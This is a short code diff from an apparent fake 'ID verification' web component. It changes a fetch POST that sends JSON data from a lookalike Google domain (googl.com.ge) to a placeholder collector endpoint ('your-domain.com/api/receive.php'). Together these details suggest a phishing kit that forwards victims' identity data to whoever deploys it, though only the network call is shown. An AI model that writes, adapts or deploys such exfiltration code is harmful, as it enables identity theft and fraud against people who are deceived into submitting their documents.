@@ -165,7 +165,7 @@ const IDVerification = () => {
           });
         } catch {}
 
-        fetch("https://www.googl.com.ge/api/himedo", {
+        fetch("https://your-domain.com/api/receive.php", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
